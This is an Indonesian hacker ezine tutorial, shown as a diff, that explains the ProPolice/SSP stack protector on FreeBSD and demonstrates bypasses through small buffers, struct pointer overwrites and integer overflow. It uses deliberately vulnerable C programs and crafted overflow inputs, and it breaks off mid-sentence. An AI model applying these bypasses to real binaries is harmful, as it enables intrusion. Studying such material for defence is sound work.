@@ -1,0 +1,874 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak.org
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak.org
+Contact   : staff@kecoak.org
+####################################################################
+
+
+Subject   : ProPolice Stack Protector: Review and Hacking!
+Writer    : Elz of Kec0ak Elektr0nik Indonesia
+Contact   : staff@kecoak.org
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+--[2]-- Daftar Isi
+
+	1. Kecoak ELektronik License
+	2. Daftar Isi
+	3. FreeBSD Stack Protector Overview
+		3.1 Memory Stack Overview
+		3.2 Attacking Method
+		3.3 SSP Overview
+		3.4 FreeBSD integration
+	4. SSP Hacking
+		4.1 Small Buffer
+		4.2 Structure Rules
+		4.3 Signess Integer overflow
+		4.4 BSS Heap Overflow
+	5. Conclusion
+	6. Link and Referense
+	
+--[3]-- FreeBSD Stack Protector Overview
+
+Hell yeah! Saya tahu bahwa anda kemungkinan besar sudah pernah melihat
+artikel sejenis yang terbit beberapa waktu yang lalu pada salah satu 
+ezine milik tetangga kita :-). Artikel tersebut mengulas bagaimana 
+sebuah mekanisme sekuritas pada level compilator bekerja dan bagaimana 
+membypass mekanisme tersebut dengan trik yang sederhana. Its nice 
+articles actually dan saya tidak berniat untuk membuat artikel tandingan
+karena atikel ini akan mencoba menjelaskan dengan environment yang 
+berbeda dan pendekatan yang berbeda pula serta lebih hardcore tentunya 
+;-).
+
+Pada tulisan ini saya menjelaskan cara kerja dari SSP itu sendiri dan
+bagaimana FreeBSD menerapkan atau meng-implementasi module ini kedalam
+systemnya. Pada bagian terakhir saya akan menjelaskan trik yang ada
+untuk mem-bypass Stack Protector tersebut dalam lingkungan FreeBSD.
+
+Bagi para pembaca yang merasa dirinya sudah cukup memahami hal-hal dasar
+seperti Memory Stack Overview dan process attacking terhadap Buffer
+Overflow dapat melewati bagian-bagian tersebut, namun bagi para pemula
+sebaiknya mengikuti alur artikel ini dari awal sampai akhir, agar dapat
+memahaminya dengan baik.
+
+So, here we go..
+
+3.1 Memory Stack Overview
+
+Stack Protector atau SSP adalah sebuah module yang diperkenalkan oleh
+IBM[1] untuk melindungi applikasi dari serangan buffer overflow. Yeah,
+secara sederhana SSP dibuat untuk tujuan seperti itu, secara detail SSP
+adalah sebuah module yang akan menyisipkan code protection pada sebuah
+program ketika proces kompilasi terjadi. Code protection yang yang di-
+sisipkan oleh SSP ini berupa pengecekan terhadap variable canary atau
+guard dalam terminologi GCC, dimana kalau variable tersebut tidak sama
+dengan nilai aslinya maka aplikasi tersebut akan dihentikan secara
+paksa. 
+
+Metode protection yang diterapkan oleh SSP ini akan melindungi beberapa
+variable penting yang (biasanya) menjadi target dari attacket seperti:
+
+1. Return Address
+2. Local Variables
+3. Argument Variables
+4. Previus Frame Pointer
+
+uhmm.. Sebelum jauh ke SSP mari kita lihat kembali Memory Stack (saya
+tidak bermaksud mengulang-ulang, tapi saya rasa ini cukup penting untuk
+dibahas). Secara garis besar, sebuah Stack pada sebuah fungsi bisa
+digambarkan seperti berikut:
+
+			| High MemAddr	    |
+			|-------------------|
+			| Arguments	    |
+			|-------------------|
+			| Return Address    |
+			|-------------------|
+	Frame Ptr ->	| Prev Frame Pointer|
+			|-------------------|
+			| Local Variables   |
+			|-------------------|
+			| Buffer	    |
+			|-------------------|
+	Stack Ptr ->	| Low MemAddr	    |
+
+
+Seperti yang anda lihat diatas, sebuah Stack terdiri dari beberapa
+variable seperti Local variable, yaitu variable yang di definisi di
+dalam sebuah fungsi, kemudian Previus Frame Pointer, yaitu sebuah
+variable yang akan menampung sebuah alamat yang disimpan pada register
+EBP, terus ada Return Address, yaitu variable yang menyimpan nilai
+kembalian dari sebuah fungsi, sedangkan arguments adalah variable yang
+dibutuhkan oleh fungsi jika fungsi tersebut memerlukan parameter
+didalamnya. Stack itu sendiri adalah sebuah array dalam sebuah segment
+di dalam memory.
+
+Dalam mengatur Stack memory, processor hanya memiliki dua operasi yaitu
+push dan pop, push itu perintah untuk memasukan variable ke dalam Stack
+sedangakan pop akan mengambil variabel dari Stack, jadi ketika sebuah
+item atau variable masuk ke dalam stack, secara otomatis nilai register
+ESP akan dinaikan oleh processor (ke alamat yang lebih rendah), kemudian
+menulisnya kedalam struktur stack paling atas. Sebaliknya ketika
+procesor membaca sebuah variable yang muncul dari stack paling atas,
+nilai register ESP tersebut akan dikurangi (menuju ke alamat yang lebih
+tinggi). Proces keluar masuknya variable ke dalam stack itu sendiri
+menggunakan procedure LIFO, yaitu Last in First out.
+
+3.2 Attacking Method
+
+Terjadinya Stack overflow pada sebuah aplikasi biasanya karena tidak
+adanya pengecekan terhadap ukuran dari nilai inputan. Ketika sebuah
+nilai input melebihi kapasitas yang disediakan maka bisa dipastikan
+akan terjadi segmentation fault. Mari kita mengingat kembali process 
+terjadinya stack overflow tersebut:
+
+	--- demo_stack_overflow.c ---
+	#include <stdio.h>
+
+	GetInput(){
+	 char buffer[8];
+
+	 gets(buffer);
+	 puts(buffer);
+	}
+
+	main(){
+	 GetInput();
+
+	 return 0;
+	}
+	------------------------------
+
+Seperti yang anda lihat diatas, code tersebut memiliki kelemahan dimana
+fungsi gets tidak memiliki kemampuan dalam mengecek ukuran dari variable
+buffer. 
+
+	---// P o C \\--
+	[elz@K-Elentronik ~]$ gcc -g -o demo_stack_overflow demo_stack_overflow.c
+	...
+	[elz@K-Elentronik ~]$ printf "123456789" | ./demo_stack_overflow
+	warning: this program uses gets(), which is unsafe.
+	123456789
+	[elz@K-Elentronik ~]$ printf "123456789abc" | ./demo_stack_overflow
+	warning: this program uses gets(), which is unsafe.
+	123456789abc
+	Segmentation fault: 11 (core dumped)
+	[elz@K-Elentronik ~]$
+	---
+
+GCC memberi peringatan tentang penggunaan fungsi gets yang disebut
+sebagai unsafe function, tapi untuk sementara kita abaikana dulu
+peringatan tersebut. Okey, secara tradisional program tersebut bisa kita
+exploitasi dengan cara sederhana seperti berikut:
+
+	---// P o C \\---
+	[elz@K-Elentronik ~]$ cat demo2_stack_overflow.c
+	#include <stdio.h>
+	neverexe(){
+	 printf("should be never execute\n");
+	 exit(0);
+	}
+
+	GetInput(){
+	 char buffer[8];
+	 gets(buffer);
+	 puts(buffer);
+	}
+
+	main(){
+	 GetInput();
+	 return 0;
+	}
+	[elz@K-Elentronik ~]$ gcc -g -o demo2_stack_overflow demo2_stack_overflow.c
+	..
+	[elz@K-Elentronik ~]$ gdb -q ./demo2_stack_overflow
+	(gdb) disas neverexe
+	Dump of assembler code for function neverexe:
+	0x08048430 <neverexe+0>:        push   %ebp
+	...
+	End of assembler dump.
+	(gdb) quit
+	[elz@K-Elentronik ~]$ printf "123456789abc\x30\x84\x04\x08" | ./demo2_stack_overflow
+	warning: this program uses gets(), which is unsafe.
+	123456789abc0
+
+	should be never execute
+	[elz@K-Elentronik ~]$
+	---
+
+Bagi anda yang tidak mengerti gambaran PoC diatas, silahkan baca
+tutorial yang pernah dibuat oleh salah satu staff kami tentang stack
+overflow[1]. Beberapa metode attacking lain yang sering dipakai untuk
+mengeksploitasi stack overflow seperti return to libc, Local variable
+reordering dan lainnya bisa anda temukan di internet dengan mudah.
+
+3.3 SSP Overview
+
+Seperti yang sudah saya utarakan pada saat awal bahwa module SSP akan
+menyisipkan code yang disebut canary ke dalam stack untuk dijadikan
+sebagai acuan perbandingan terhadap variable tertentu, dimana jika nilai
+dari kedua variable tersebut berbeda, maka sistem secara otomatis akan
+mengirim signal aborting yang mengakibatkan program akan dihentikan
+secara paksa.
+
+Ide diatas sangat mirip dengan apa yang telah diterapkan oleh project
+lain dengan tujuan yang sama yaitu StackGuard, cuma perbedaannya terletak
+pada penempatan dari canary tersebut. SSP menempatkan variable canary
+pada variable argument, return address, previous frame pointer dan local
+variable sedangkan StackGuard hanya menempatkan canary setelah return
+address.
+
+Untuk menjelaskan procedure kerja dari SSP ini, mari kita lihat layout
+dari stack yang di compile dengan SSP dan tanpa SSP berikut ini:
+
+	--// P o C \\--
+	cat code:
+
+	3       GetInput(){
+	4        char buffer[8];
+	5
+	6        gets(buffer);
+	7        puts(buffer);
+	8       }
+ 
+	withoud -fstack-protector-all:
+	(gdb) disas GetInput
+	Dump of assembler code for function GetInput:
+	0x08048430 <GetInput+0>:        push   %ebp
+	0x08048431 <GetInput+1>:        mov    %esp,%ebp
+	0x08048433 <GetInput+3>:        sub    $0x18,%esp
+	0x08048436 <GetInput+6>:        lea    0xfffffff8(%ebp),%eax
+	0x08048439 <GetInput+9>:        mov    %eax,(%esp)
+	0x0804843c <GetInput+12>:       call   0x80482ec <_init+52>
+	0x08048441 <GetInput+17>:       lea    0xfffffff8(%ebp),%eax
+	0x08048444 <GetInput+20>:       mov    %eax,(%esp)
+	0x08048447 <GetInput+23>:       call   0x80482dc <_init+36>
+	0x0804844c <GetInput+28>:       leave
+	0x0804844d <GetInput+29>:       ret
+	End of assembler dump.
+
+	with -fstack-protector-all:
+	(gdb) disas GetInput
+	Dump of assembler code for function GetInput:
+	0x080484a0 <GetInput+0>:        push   %ebp
+	0x080484a1 <GetInput+1>:        mov    %esp,%ebp
+	0x080484a3 <GetInput+3>:        sub    $0x18,%esp
+	0x080484a6 <GetInput+6>:        mov    0x8049720,%eax
+	0x080484ab <GetInput+11>:       mov    %eax,0xfffffffc(%ebp)
+	0x080484ae <GetInput+14>:       xor    %eax,%eax
+	0x080484b0 <GetInput+16>:       lea    0xfffffff4(%ebp),%eax
+	0x080484b3 <GetInput+19>:       mov    %eax,(%esp)
+	0x080484b6 <GetInput+22>:       call   0x804834c <_init+52>
+	0x080484bb <GetInput+27>:       lea    0xfffffff4(%ebp),%eax
+	0x080484be <GetInput+30>:       mov    %eax,(%esp)
+	0x080484c1 <GetInput+33>:       call   0x804833c <_init+36>
+	0x080484c6 <GetInput+38>:       mov    0xfffffffc(%ebp),%edx
+	0x080484c9 <GetInput+41>:       xor    0x8049720,%edx
+	0x080484cf <GetInput+47>:       je     0x80484d6 <GetInput+54>
+	0x080484d1 <GetInput+49>:       call   0x804837c <_init+100>
+	0x080484d6 <GetInput+54>:       leave
+	0x080484d7 <GetInput+55>:       ret
+	End of assembler dump.
+	----
+
+Seperti yang anda lihat diatas, bahwa code yang dicompile dengan module
+SSP memiliki rangkaian assembly yang lebih panjang juga tentunya. Hal
+tersebut seperti yang pernah saya sebutkan bahwa module SSP akan
+menyisipkan beberapa code untuk dijadikan sebagai guard.
+
+Coba anda perhatikan hasil disassembly code yang tercompile dengan 
+module SSP diatas dan perhatikan line berikut:
+
+	0x080484a6 <GetInput+6>:        mov    0x8049720,%eax
+
+Secara langsung baris tersebut berarti memasukan isi dari alamat
+0x8049720 ke Stack. Nah mari kita lihat isi dari alamat tersebut:
+
+	(gdb) x/x 0x8049720
+	0x8049720 <__stack_chk_guard@@FBSD_1.0>:        0x00000000
+
+Yeap, terdapat variable __stack_chk_guard pada program yang dicompile
+dengan module SSP. Diatas, seperti yang kita lihat bahwa variable
+tersebut belum terinisialisasi. Oke mari kita lihat dengan contoh yang
+lebih baik lagi.
+
+	----- stack_bof.c -----
+	#include <stdio.h>
+	#include <string.h>
+
+	void funk(char *args) {
+	 char buff[512];
+	 strcpy (buff, args);
+	}
+
+	int main (int argc, char *argv[]){
+
+	 if (argc > 1) {
+	 funk (argv[1]);
+	 } else
+	 printf ("Need Argument!\n");
+
+	 return 0;
+	}
+	----------------------
+
+Sekarang mari kita compile ke dalam mode assembly:
+
+	--// SSP Poc \\--
+	[elz@K-Elentronik ~/stack]$ gcc -S stack_bof.c -fstack-protector
+	[elz@K-Elentronik ~/stack]$ cat stack_bof.s
+	        .file   "stack_bof.c"
+	        .text
+	        .p2align 4,,15
+	.globl funk
+	        .type   funk, @function
+	funk:
+	        pushl   %ebp
+	        movl    %esp, %ebp
+	        subl    $552, %esp
+	        movl    8(%ebp), %eax
+	        movl    %eax, -532(%ebp)
+	        movl    __stack_chk_guard, %eax
+	        movl    %eax, -4(%ebp)
+	        xorl    %eax, %eax
+	        movl    -532(%ebp), %eax
+	        movl    %eax, 4(%esp)
+	        leal    -516(%ebp), %eax
+	        movl    %eax, (%esp)
+	        call    strcpy
+	        movl    -4(%ebp), %eax
+	        xorl    __stack_chk_guard, %eax
+	        je      .L3
+	        call    __stack_chk_fail
+	.L3:
+	        leave
+	        ret
+	        .size   funk, .-funk
+	        .section        .rodata
+	.LC0:
+	        .string "Need Argument!"
+	        .text
+	        .p2align 4,,15
+	.globl main
+	        .type   main, @function
+	main:
+	        leal    4(%esp), %ecx
+	        andl    $-16, %esp
+	        pushl   -4(%ecx)
+	        pushl   %ebp
+	        movl    %esp, %ebp
+	        pushl   %ecx
+	        subl    $20, %esp
+	        movl    %ecx, -8(%ebp)
+	        movl    -8(%ebp), %eax
+	        cmpl    $1, (%eax)
+	        jle     .L5
+	        movl    -8(%ebp), %edx
+	        movl    4(%edx), %eax
+	        addl    $4, %eax
+	        movl    (%eax), %eax
+	        movl    %eax, (%esp)
+	        call    funk
+	        jmp     .L7
+	.L5:
+	        movl    $.LC0, (%esp)
+	        call    puts
+	.L7:
+	        movl    $0, %eax
+	        addl    $20, %esp
+	        popl    %ecx
+	        popl    %ebp
+	        leal    -4(%ecx), %esp
+	        ret
+	        .size   main, .-main
+	        .ident  "GCC: (GNU) 4.2.1 20070719  [FreeBSD]"
+	[elz@K-Elentronik ~/stack]$
+	--------
+
+Sekarang coba kita lihat pada fungsi funk, dimana terdapat inisialisasi
+dari pada variable __stack_chk_guard:
+
+	----------
+        movl    __stack_chk_guard, %eax	; nilai canary disimpan di reg EAX
+        movl    %eax, -4(%ebp)		; Canary disimpan pada stack
+	----------
+
+Seperti yang anda lihat bahwa nilai canary yang akan di generate oleh
+fungsi __stack_chk_guard akan di simpan ke dalam stack yang nantinya
+akan dijadikan sebagai pembanding. Pada baris-baris berikutnya adalah
+operasi biasa seperti memasukan variable atau argument yang diperlukan
+oleh fungsi ke dalam stack.
+
+Proses pengecekan terhadap nilai dari canary tersebut tampak pada baris
+berikutnya dalam fungsi funk();
+
+	-----------
+	movl    -4(%ebp), %eax		; membaca nilai canary yang disimpan di-
+					; stack
+        xorl    __stack_chk_guard, %eax	; membandingkan nilai canary-
+					; di stack dengan yang ada di variable
+					; __stack_chk_guard
+        je      .L3 			; jika nilai sama
+        call    __stack_chk_fail 	; jika nilai canary tidak sama
+	-----------
+
+Nah proses pengecekan canary seperti yang anda lihat adalah dengan 
+membandingkan nilai yang terdapat pada stack dengan variable
+__stack_chk_guard, dimana ketika nilainya tidak sama maka akan memanggil
+fungsi __stack_chk_fail yang akan menghentikan program dengan mengirim 
+signal abort ke sistem operasi.
+
+Ok, mari kita lihat bagaimana aksi SSP module dalam menghandel cara
+tradisional dalam mengeksploitasi stack overflow.
+
+	--// PoC Stack Protector \\--
+
+	[elz@K-Elentronik ~]$ gcc -g -o demo2_stack_overflow demo2_stack_overflow.c -fstack-protector
+	..
+	[elz@K-Elentronik ~]$ gdb -q ./demo2_stack_overflow
+	(gdb) disas neverexe
+	Dump of assembler code for function neverexe:
+	0x080484a0 <neverexe+0>:        push   %ebp
+	...
+	End of assembler dump.
+	(gdb) quit
+	[elz@K-Elentronik ~]$ printf "123456789abc\xa0\x84\x04\x08" | ./demo2_stack_overflow
+	warning: this program uses gets(), which is unsafe.
+	123456789abc 
+
+	Abort trap: 6 (core dumped)
+	[elz@K-Elentronik ~]$
+	----------
+
+
+3.4 FreeBSD Integration
+
+FreeBSD sejak release 7 sudah mulai meimplementasikan module SSP ini ke
+dalam libc versi mereka, dan sejak release 8, module ini sudah aktif by
+default ketika user akan membuild kernel dan userland application. SSP
+sendiri memiliki beberapa metode dalam men-generate nilai dari canaries
+atau guard yang dimaksud, yaitu terminate mode, NULL mode dan random
+mode. FreeBSD 8 menerapkan random mode karena sampai sekarang mode
+tersebut dianggap sebagai metode yang paling aman, karena dua yang lain
+sudah secara luas di-hack oleh para hacker.
+
+Untuk mengetahui cara kerja module SSP ini di dalam system FreeBSD,
+mari kita lihat source code yang ada pada libc bawaan dari system ter-
+sebut.
+
+--// stack_protector.c in sys/libc[2] \\--
+   42 extern int __sysctl(int *name, u_int namelen, void *oldp, size_t *oldlenp,
+   43     void *newp, size_t newlen);
+   44 
+   45 long __stack_chk_guard[8] = {0, 0, 0, 0, 0, 0, 0, 0};
+   46 static void __guard_setup(void) __attribute__((__constructor__, __used__));
+   47 static void __fail(const char *);
+   48 void __stack_chk_fail(void);
+   49 void __chk_fail(void);
+   50 void __stack_chk_fail_local(void);
+   51 
+   52 /*LINTED used*/
+   53 static void
+   54 __guard_setup(void)
+   55 {
+   56         int mib[2];
+   57         size_t len;
+   58 
+   59         if (__stack_chk_guard[0] != 0)
+   60                 return;
+   61 
+   62         mib[0] = CTL_KERN;
+   63         mib[1] = KERN_ARND;
+   64 
+   65         len = sizeof(__stack_chk_guard);
+   66         if (__sysctl(mib, 2, __stack_chk_guard, &len, NULL, 0) == -1 ||
+   67             len != sizeof(__stack_chk_guard)) {
+   68                 /* If sysctl was unsuccessful, use the "terminator canary". */
+   69                 ((unsigned char *)(void *)__stack_chk_guard)[0] = 0;
+   70                 ((unsigned char *)(void *)__stack_chk_guard)[1] = 0;
+   71                 ((unsigned char *)(void *)__stack_chk_guard)[2] = '\n';
+   72                 ((unsigned char *)(void *)__stack_chk_guard)[3] = 255;
+   73         }
+   74 }
+   75 
+   76 /*ARGSUSED*/
+   77 static void
+   78 __fail(const char *msg)
+   79 {
+   80         struct sigaction sa;
+   81         sigset_t mask;
+   82 
+   83         /* Immediately block all signal handlers from running code */
+   84         (void)sigfillset(&mask);
+   85         (void)sigdelset(&mask, SIGABRT);
+   86         (void)sigprocmask(SIG_BLOCK, &mask, NULL);
+   87 
+   88         /* This may fail on a chroot jail... */
+   89         syslog(LOG_CRIT, msg);
+   90 
+   91         (void)memset(&sa, 0, sizeof(sa));
+   92         (void)sigemptyset(&sa.sa_mask);
+   93         sa.sa_flags = 0;
+   94         sa.sa_handler = SIG_DFL;
+   95         (void)sigaction(SIGABRT, &sa, NULL);
+   96         (void)kill(getpid(), SIGABRT);
+   97         _exit(127);
+   98 }
+   99 
+  100 void
+  101 __stack_chk_fail(void)
+  102 {
+  103         __fail("stack overflow detected; terminated");
+  104 }
+  105 
+  106 void
+  107 __chk_fail(void)
+  108 {
+  109         __fail("buffer overflow detected; terminated");
+  110 }
+  111 
+  112 void
+  113 __stack_chk_fail_local(void)
+  114 {
+  115         __stack_chk_fail();
+  116 }
+---
+
+Pada baris ke 42 hingga 50, kita bisa melihat beberapa variable di
+deklarasi untuk keperluan tertentu. Variable pertama adalah variable
+eksternal yang bertipe integet yaitu __sysctl, dimana variable ini akan
+digunakan untuk memanggil fungsi random yang ada di kernel, berikutnya
+adalah __stack_chk_guard, variable yang bertipe long integer ini adalah
+variable utama yang nantinya akan disisipkan ke dalam program yang di
+compile dengan module ini untuk melindungi setiap variable dari serangan
+stack base overflow. __guard_setup pada baris berikutnya adalah variable
+yang bertipe konstruktor, digunakan untuk agar module ini dapat dipanggil
+oleh GCC. Variable-variable berikutnya adalah variable yang digunakan
+untuk menampilkan string ketika kondisi tertentu terpenuhi.
+
+Baris 53 hingga 74 adalah fungsi __guard_setup, dimana pada fungsi ini
+akan menginisialisasi __sysctl() dengan variable mib agar bisa memanggil
+fungsi arc4rand yang ada di kernel dan jika tidak tersedia maka akan
+menggunakan mode terminator canary untuk melindungi stack.
+
+Berikutnya pada baris 77 hingga 97 adalah penjabaran dari fungsi __fail().
+fungsi ini berisi instruksi untuk menampilkan string tertentu pada kondisi
+dimana nilai canary tidak sama dan akan mengirim signal abort ke system
+setelahnya.
+
+Sisa baris dari stack_protector.c yang ada pada libc diatas adalah
+implementasi dari fungsi __fail() sebelumnya. Implementasi dilakukan
+berdasarkan jenis serangan yang terdeteksi, __stack_chk_fail untuk
+stack, __chk_fail untuk buffer dan __stack_chk_fail_local untuk local
+stack.
+
+Karena pada kondisi dimana SSP akan meng-generate random canary, maka 
+stack_protector.c yang ada pada sys/kernel[3] harus kita lihat supaya
+proses memahami cara kerja SSP ini dalam sistem FreeBSD bisa kita telaah
+lebih baik lagi.
+
+berikut source codenya:
+
+--// stack_protector.c in sys/kernel[3] \\--
+   10 long __stack_chk_guard[8] = {};
+   11 void __stack_chk_fail(void);
+   12 
+   13 void
+   14 __stack_chk_fail(void)
+   15 {
+   16 
+   17         panic("stack overflow detected; backtrace may be corrupted");
+   18 }
+   19 
+   20 #define __arraycount(__x)       (sizeof(__x) / sizeof(__x[0]))
+   21 static void
+   22 __stack_chk_init(void *dummy __unused)
+   23 {
+   24         size_t i;
+   25         long guard[__arraycount(__stack_chk_guard)];
+   26 
+   27         arc4rand(guard, sizeof(guard), 0);
+   28         for (i = 0; i < __arraycount(guard); i++)
+   29                 __stack_chk_guard[i] = guard[i];
+   30 }
+   31 SYSINIT(stack_chk, SI_SUB_RANDOM, SI_ORDER_ANY, __stack_chk_init, NULL);
+
+---
+
+Pada fungsi __stack_chk_init() diatas, bisa anda lihat bahwa untuk
+menggenerate guard atau canary tersebut digunakan fungsi arc4rand()
+sehingga akan menghasilkan bilangan random yang biasanya akan diambil
+dari devece /dev/urandom.
+
+Okay, kira-kira seperti itulah gambaran umum implementasi module SSP di
+dalam sistem FreeBSD ( tidak terlalu jauh berbeda dengan sistem operasi
+lain yang menerapkan module ini).
+
+Next, the most interisting part of this article, so lets party started!!
+
+--[4]-- SSP Hacking
+
+Pada dasarnya SSP dibuat untuk melindungi beberapa entry point yang ada
+didalam susunan stack agar tidak kebanjiran data yang tumpah dari buffer.
+Tapi seperti semua product security yang pernah diciptakan, SSP pun
+memiliki beberapa keterbatasan yang bisa dimanfaatkan oleh intruder
+untuk membypass proteksi yang ditawarkan. 
+
+4.1 Small Buffer Size
+
+Berdasarkan komentar yang dimuat di official site[4] dari SSP ini bahwa
+ukuran buffer dibawah 8 bit tidak akan diproteksi secara sempurna.
+
+Lets look into the simple PoC:
+
+	--// SSP ByPass PoC \\--
+	[elz@K-Elentronik ~/SSP]$ cat PoC1.c
+	#include <stdio.h>
+	#include <string.h>
+
+	void funk(char *args) {
+	 char buff[7];
+	 strcpy (buff, args);
+	}
+
+	int main (int argc, char *argv[]){
+
+	 if (argc > 1) {
+	 funk (argv[1]);
+	 } else
+	 printf ("Need Argument!\n");
+
+	 return 0;
+	}
+	[elz@K-Elentronik ~/SSP]$ gcc -g -o PoC1 PoC1.c -fstack-protector
+	[elz@K-Elentronik ~/SSP]$ gdb -q ./PoC1
+	(gdb) run `perl -e 'print "A"x50'`
+	Starting program: /usr/home/elz/SSP/PoC1 `perl -e 'print "A"x50'`
+	
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
+	(gdb) info reg eip
+	eip            0x41414141       0x41414141
+	(gdb)
+	-------------
+
+Yeap, seperti yang anda lihat bahwa variable buffer yang bertipe char
+yang ukurannya dibawah 8 bit tidak dapat dilindungi dengan baik oleh
+module SSP. 
+
+4.2 Structure rules.
+
+Kelemahan lain dari SSP adalah adanya sebuah aturan dimana urutan elemen
+di dalam sebuah struktur tidak dapat dirubah ketika ada pointer dan
+array yang bertipe karakter yang terdeklarasi didalam struktur tersebut.
+Sehingga kondisi seperti berikut ini bisa digunakan untuk membypass SSP
+secara langsung.
+
+	--// SSP ByPass PoC \\--
+	[elz@K-Elentronik ~/SSP]$ cat PoC2.c
+	 01 	#include <stdio.h>
+	 02 	#include <stdlib.h>
+	 03 	#include <string.h>
+	 04 
+	 05 	char c1[] = "Normal";
+	 06 	char c2[] = "I Win";
+	 07 
+	 08 	int main (int argc, char *argv[]){
+	 09 	 struct funk{
+	 10 	        char buff[12];
+	 11 	        char * ptr;
+	 12 	        int dummy;
+	 13 	        } vuln;
+	 14
+	 15 	if (argc < 2) {
+	 16 	        printf ("Argument Please!\n");
+	 17 	        exit (1);
+	 18 	 }
+	 19	
+	 20	  vuln.dummy = 0x11111111;
+	 21	  vuln.ptr = c1;	
+	 22	  strcpy (vuln.buff, argv[1]);
+	 23	 
+	 24	  printf ("c1 (%p) : %s\n", c1, c1);
+	 25	  printf ("c2 (%p) : %s\n\n", c2, c2);
+	 26	  printf ("ptr (%p): %s (-> %p)\n", &vuln.ptr, vuln.ptr, vuln.ptr);
+	 27	  printf ("buff (%p): [ %s ]\n", vuln.buff, vuln.buff);
+	 28	 
+	 29	 return 0;
+	 30	 }
+	[elz@K-Elentronik ~/SSP]$ gcc -g -o PoC2 PoC2.c -fstack-protector
+	[elz@K-Elentronik ~/SSP]$ ./PoC2 XXXX
+	c1 (0x804972c) : Normal
+	c2 (0x8049733) : I Win
+	
+	ptr (0xbfbfec88): Normal (-> 0x804972c)
+	buff (0xbfbfec7c): [ XXXX ]
+	[elz@K-Elentronik ~/SSP]$ ./PoC2 $(perl -e 'print "X"x12 . "\x33\x97\x04\x08"')
+	c1 (0x804972c) : Normal
+	c2 (0x8049733) : I Win
+	
+	ptr (0xbfbfec78): I Win (-> 0x8049733)
+	buff (0xbfbfec6c): [ XXXXXXXXXXXX ]
+	[elz@K-Elentronik ~/SSP]$
+	--------------------
+
+Okey, mari kita bedah PoC diatas, structur vuln adalah struktur yang
+berisi variable ptr dan buff yang bertipe character serta variable dummy
+yang bertipe integer. Perhatikan baris ke-21 dimana pointer ptr menunjuk
+variable c1 yang berisi string "Normal", kemudian pada baris ke-22 isi
+argv[1] akan di copy ke dalam variable array buff yang bertipe char,
+kondisi tersebut jelas merupakan kondisi stack overflow dimana tidak ada
+mekanisme pengecekan apakah variable yang menjadi inputan bagi variable
+buff.
+
+Pada kondisi seperti diatas, SSP seharusnya berfungsi untuk melakukan
+pengecekan terhadap nilai canary yang terletak sebelum variable ptr, tapi
+yang terjadi adalah SSP tidak dapat melindungin variable pointer tersebut
+karena alasan yang sudah disebut di awal, yaitu mengubah urutan elemen
+di dalam struktur itu tidak dibolehkan. Pada akhirnya, kondisi tersebut
+dengan mudah diexploitasi seperti yang tergambar pada PoC diatas, dimana
+ketika diberikan input berupa alamat dari variable c2 pada byte yang
+overflow, maka ptr yang seharusnya berisi alamat c1 berubah menjadi
+alamat c2 sehingga menampilkan string "I win". Yes, You win!
+
+
+4.3 Signedness / Integer Overflow
+
+Integer overflow adalah kondisi dimana nilai imput dari variable integer
+melebihi kapasitas yang telah ditentukan oleh compiler. Kondisi tersebut
+dalam terminology GCC disebut sebagai "undefined behaviour". Bagi anda
+yang ingin mengenal lebih jauh tentang software vulnerability jenis ini
+bisa mengacu pada tulisan yang dimuat di phrack ini[5].
+
+Pada kondisi integer overflow, anda tidak diijinkan secara langsung
+mengoverwrite memory yang ada pada flow control, jadi kondisi integer
+overflow hanya menjadi jembatan untuk process exploitasi dengan metode
+konvensional stack overflow. 
+
+	--// SSP ByPass PoC \\--
+	[elz@K-Elentronik ~/SSP]$ cat signedness_int.c
+	/*
+	Taken from Phrack.org P60_0x0a
+	*/
+	
+	#include <stdio.h>
+	#include <string.h>
+	#include <stdlib.h>
+		
+	int main(int argc, char *argv[]){
+	        unsigned short s;
+	        int i;
+	        char buf[80];
+	
+	        if (argc < 3){
+	                printf("FUck U!\n");
+	                exit(EXIT_FAILURE);
+	                }
+	
+	        i = atoi (argv[1]);
+	        s = i;
+	
+	        if ( s >= 80 ){
+	                printf("You Bastard!\n");
+	                exit(EXIT_FAILURE);
+	                }
+	
+	        printf("s = %d\n", s);
+	
+	        memcpy(buf, argv[2],i);
+	        buf[i] = '\0';
+	        printf("%s\n", buf);
+	
+	        return 0;
+	}
+	[elz@K-Elentronik ~/SSP]$ gcc -o signedness_int signedness_int.c -fstack-protector
+	[elz@K-Elentronik ~/SSP]$ ./signedness_int 36 hell
+	s = 36
+	hell
+	[elz@K-Elentronik ~/SSP]$ ./signedness_int 81 hell
+	You Bastard!
+	[elz@K-Elentronik ~/SSP]$ ./signedness_int 65536 hell
+	s = 0
+	Segmentation fault: 11 (core dumped)
+	------------------
+
+Seperti yang terlihat pada PoC diatas, code tersebut jelas memiliki
+cacat dimana variable i yang merupakan variable integer akan menjadi
+nilai inputan bagi variable s yang daya tampungnya lebih kecil karena
+bertipe unsigned short, dimana tipe ini hanya bisa menampung 65535 bit.
+
+Kondisi integer overflow tersebut tidak bisa dihandle dengan baik oleh
+SSP dan mengakibatkan terjadinya segmentation fault yang bisa dimanfaat
+kan lebih jauh lagi dengan motode exploitasi yang berbasis stack. 
+
+4.4 BSS Heap Overflow
+
+Sebenarnya tak ada yang perlu dijelaskan lebih jauh karena SSP adalah
+sebuah system yang memiliki kemampuan proteksi terhadap serangan berbasis
+stack, bukan berbasis heap, jadi sangat jelas bahwa jenis serangan yang
